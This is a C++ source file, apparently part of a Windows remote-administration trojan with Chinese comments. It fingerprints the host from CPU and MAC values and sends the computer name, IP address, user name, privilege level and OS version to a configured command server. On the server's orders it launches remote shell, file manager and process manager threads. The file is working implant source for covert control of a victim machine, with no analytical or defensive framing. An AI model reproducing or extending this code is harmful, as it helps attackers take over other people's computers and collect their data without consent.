// KernelManager.cpp: implementation of the CKernelManager class.
//
//////////////////////////////////////////////////////////////////////

#include "stdafx.h"
#include "KernelManager.h"
#include "loop.h"
char	CKernelManager::m_ServerHost[260] = {0};
UINT	CKernelManager::m_ServerPort = 9527;
//////////////////////////////////////////////////////////////////////
// Construction/Destruction
//////////////////////////////////////////////////////////////////////

CKernelManager::CKernelManager(
	CClientSocket *pClient,
	char* lpszServerHost,
	UINT nServerPort
			) : CManager(pClient)
{

	if (lpszServerHost != NULL)
		strcpy(m_ServerHost, lpszServerHost);
	m_ServerPort = nServerPort;
	m_nThreadCount = 0;
	m_bIsActived = false;
}

CKernelManager::~CKernelManager()
{
	for(int i = 0; i < m_nThreadCount; i++)
	{
		TerminateThread(m_hThread[i], -1);
		CloseHandle(m_hThread[i]);
	}
}
// 加上激活
void CKernelManager::OnReceive(LPBYTE lpBuffer, UINT nSize)
{

	DATA *cmd = (DATA *)lpBuffer;

	switch (cmd->header.flag)
	{
	case SERVER_ACTIVED:
		InterlockedExchange((LONG *)&m_bIsActived, true);
		break;

	case SERVER_SHELLMANAGER: // 远程shell
		m_hThread[m_nThreadCount++] = (HANDLE)_beginthreadex(NULL, 0, Loop_ShellManager, 
			(void*)m_ID, 0, NULL);
		break;
	case SERVER_FILEMANAGER: // 文件管理
		m_hThread[m_nThreadCount++] = (HANDLE)_beginthreadex(NULL, 0, Loop_FileManager, 
			(void*)m_ID, 0, NULL);
		break;
	case SERVER_PROCESSMANAGER: // 进程
		m_hThread[m_nThreadCount++] = (HANDLE)_beginthreadex(NULL, 0, Loop_ProcessManager, 
			(void*)m_ID, 0, NULL);
		break;
// 	case COMMAND_REPLAY_HEARTBEAT: // 回复心跳包
// 		break;
	}	
}

bool CKernelManager::IsActived()
{
	return	m_bIsActived;	
}

int CKernelManager::sendLoginInfo()
{
	// 登录信息
	LOGIN	LoginInfo;
	memset(&LoginInfo,0,sizeof(LOGIN));
	//////////////////////////////////////////////////////////////////////////
	// 开始构造数据
	m_ID = GetCpuID() + GetAdapterID();
	LoginInfo.header.ID = m_ID;
	LoginInfo.header.datalength	= sizeof(LOGIN);
	LoginInfo.header.flag = CLIENT_LOGIN;
	LoginInfo.OsVerInfoEx.dwOSVersionInfoSize = sizeof(OSVERSIONINFOEX);
	GetVersionEx((OSVERSIONINFO *)&LoginInfo.OsVerInfoEx); 
	//////////////////////////////////////////////////////////////////////////
	// get host name
	wchar_t hostname[50] = {0};
	DWORD	dwComputerNameLen = 50;
	GetComputerName(hostname,&dwComputerNameLen);
	memcpy(&LoginInfo.HostName, hostname, sizeof(LoginInfo.HostName));
	//////////////////////////////////////////////////////////////////////////
	// get sock addr
	sockaddr_in  sockAddr;
	memset(&sockAddr, 0, sizeof(sockAddr));
	int nSockAddrLen = sizeof(sockAddr);
	getsockname(m_pClient->m_Socket ,(SOCKADDR*)&sockAddr, &nSockAddrLen);
	memcpy(&LoginInfo.IPAddress, (void *)&sockAddr.sin_addr, sizeof(IN_ADDR));
	
	//////////////////////////////////////////////////////////////////////////
	// Get username
	wchar_t username[50] = {0};   
	DWORD cbUser = 50;       
	GetUserName (username, &cbUser);
	memcpy(&LoginInfo.UserName, username, sizeof(LoginInfo.UserName));
	//////////////////////////////////////////////////////////////////////////
	LPUSER_INFO_2 pTmpBuf = NULL ;
	NetUserGetInfo(NULL,LoginInfo.UserName,2,(LPBYTE*)&pTmpBuf);
	LoginInfo.Privilege = pTmpBuf->usri2_priv;
	int nRet = m_pClient->Send((LPBYTE)&LoginInfo, sizeof(LOGIN));

	return 0;
}

UINT CKernelManager::GetCpuID()
{
	UINT  uCpuID     = 0;
	UINT  uCpuID1 = 0,uCpuID3 = 0,uCpuID4 = 0;
	_asm
	{
		mov eax, 1
			cpuid
			mov uCpuID1, eax
			mov uCpuID3, ecx
			mov uCpuID4, edx
	}
	uCpuID = uCpuID1 + uCpuID3 + uCpuID4;
	return uCpuID;
}
UINT CKernelManager::GetAdapterID()
{
	UINT uID = 0;
	PIP_ADAPTER_INFO pIpAdapterInfo = new IP_ADAPTER_INFO();
	unsigned long stSize = sizeof(IP_ADAPTER_INFO);
	memset(pIpAdapterInfo,0,stSize);
	int nRel = GetAdaptersInfo(pIpAdapterInfo,&stSize);
	if (ERROR_BUFFER_OVERFLOW == nRel)
	{
		delete pIpAdapterInfo;
		pIpAdapterInfo = (PIP_ADAPTER_INFO)new BYTE[stSize];
		memset(pIpAdapterInfo,0,stSize);
		nRel=GetAdaptersInfo(pIpAdapterInfo,&stSize);    
	}
	if (ERROR_SUCCESS == nRel)
	{
		char s[40] = {0};
		while (pIpAdapterInfo)
		{
			if(pIpAdapterInfo->AddressLength == 0)
			{	
				pIpAdapterInfo = pIpAdapterInfo->Next;
				continue;
			}
			sprintf_s(s,"%02d%02d%02d",
				pIpAdapterInfo->Address[1],
				pIpAdapterInfo->Address[3],
				pIpAdapterInfo->Address[5]
			);
			uID = strtol(s, NULL, 10);
			pIpAdapterInfo = pIpAdapterInfo->Next;
		}
	}
	if (pIpAdapterInfo)
	{delete pIpAdapterInfo;}
	return uID;
}